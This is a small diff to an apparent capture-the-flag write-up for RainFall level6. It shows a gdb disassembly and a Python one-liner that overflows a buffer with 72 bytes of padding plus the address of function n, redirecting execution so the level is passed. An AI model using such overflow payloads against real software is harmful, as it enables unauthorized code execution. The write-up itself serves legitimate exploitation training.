@@ -107,8 +107,8 @@ So we can run simply ```Some 72 bytes + Start address of n() function```.
 (gdb) disas n
 Dump of assembler code for function n:
    0x08048454 <+0>:     push   %ebp
-level6@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3" + "\x54\x84\x04\x08"' > /tmp/exploit5
-level6@RainFall:~$ ./level6 $(cat /tmp/exploit5)
+level6@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3" + "\x54\x84\x04\x08"' > /tmp/exploit6
+level6@RainFall:~$ ./level6 $(cat /tmp/exploit6)
 (hidden)
 ```
 level6 passed !
